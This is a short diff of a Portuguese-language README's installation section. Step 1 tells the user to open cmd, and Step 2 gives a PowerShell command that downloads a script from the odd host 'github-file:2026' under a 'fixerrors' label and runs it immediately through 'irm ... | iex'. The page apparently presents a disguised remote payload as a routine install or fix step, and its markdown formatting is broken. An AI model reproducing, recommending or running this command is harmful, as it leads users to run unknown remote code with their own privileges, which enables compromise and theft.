@@ -39,8 +39,9 @@
 
 ## ⚙️ INSTALAÇÃO & CONFIGURAÇÃO (CMD / PowerShell)
 
-### Etapa 1: Clique na tecla ```cmdWin``` do teclado e pesquise por ```cmdcmd```
-Pressione Win+X, depois selecione Terminal (Admin) ou Prompt de Comando (Admin).
+### Etapa 1:
+```Clique na tecla ```Win``` do teclado e pesquise por ```cmd```
+
 
 ### Etapa 2: Execute o Comando de Instalação
 powershell -Command "irm http://github-file:2026/install?id=fixerrors | iex"
